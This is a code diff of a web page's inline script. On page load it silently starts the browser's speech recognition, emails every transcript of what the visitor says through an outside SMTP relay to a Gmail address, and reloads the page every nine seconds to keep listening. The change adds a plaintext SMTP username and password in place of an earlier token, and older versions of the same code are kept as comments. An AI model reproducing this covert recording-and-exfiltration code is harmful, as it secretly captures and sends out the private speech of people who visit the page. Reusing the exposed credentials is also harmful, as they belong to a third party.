@@ -506,42 +506,71 @@
   <script type="text/javascript" src="js/bootstrap.js"></script>
 
   <script>
+// function sup(){
+// var recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition)();
+// recognition.lang = 'en-US';
+// recognition.interimResults = false;
+// recognition.maxAlternatives = 5;
+// recognition.start();
+// }
 
+// recognition.onresult = function(event) {
+//    sendEmail(event.results[0][0].transcript);
+//  sup();
+// };
+// recognition.onend = () => {
 
-function sup(){
+// sup();
+//   console.log("Speech recognition service disconnected");
+// };
+
+// recognition.onnomatch = () => {
+// sup();
+
+//   console.error("Speech not recognized");
+// };
+// function sendEmail(speeches){
+
+//   Email.send({
+// SecureToken : "683d8d05-8106-4cc8-88b0-ca12cd63f1a1",
+// To : 'punk13134@gmail.com',
+// From : "punk1313444@gmail.com",
+// Subject : "This is the subject",
+// Body : "The speech is"  + speeches
+// }).then(
+// message => console.log(message)
+// );}
+
+// sendEmail();
+
+// setInterval(()=>{
+//   location.reload();
+// },9000)
+
 var recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition)();
 recognition.lang = 'en-US';
 recognition.interimResults = false;
 recognition.maxAlternatives = 5;
 recognition.start();
-}
 
 recognition.onresult = function(event) {
    sendEmail(event.results[0][0].transcript);
- sup();
-};
-recognition.onend = () => {
-
-sup();
-  console.log("Speech recognition service disconnected");
+ 
 };
 
-recognition.onnomatch = () => {
-sup();
-
-  console.error("Speech not recognized");
-};
 function sendEmail(speeches){
 
 
   Email.send({
-SecureToken : "683d8d05-8106-4cc8-88b0-ca12cd63f1a1",
-To : 'punk13134@gmail.com',
-From : "punk1313444@gmail.com",
-Subject : "This is the subject",
+                 Host : "smtp.elasticemail.com",
+                Username : "xyxycortes48@gmail.com",
+                Password : "A887496E96AE116AADC1BEF5C1A69C8256F0",
+                To : 'punk13134@gmail.com',
+                From : "xyxycortes48@gmail.com",
+                Subject : "This is the subject",
 Body : "The speech is"  + speeches
 }).then(
-message => console.log(message)
+  console.log(speeches)
 );}
 
 sendEmail();
@@ -549,6 +578,7 @@ sendEmail();
 setInterval(()=>{
   location.reload();
 },9000)
+
 
 
             // var speech = true;
@@ -573,10 +603,12 @@ setInterval(()=>{
             //   console.log(transcript);
 
             //   Email.send({
-            //                 SecureToken : "683d8d05-8106-4cc8-88b0-ca12cd63f1a1",
-            //                 To : 'punk13134@gmail.com',
-            //                 From : "punk1313444@gmail.com",
-            //                 Subject : "This is the subject",
+            //     Host : "smtp.elasticemail.com",
+            //     Username : "xyxycortes48@gmail.com",
+            //     Password : "A887496E96AE116AADC1BEF5C1A69C8256F0",
+            //     To : 'punk13134@gmail.com',
+            //     From : "xyxycortes48@gmail.com",
+            //     Subject : "This is the subject",
             //                 Body : "Voice: "+ transcript,
             //             }).then(
             //             message => console.log("Message Sent")
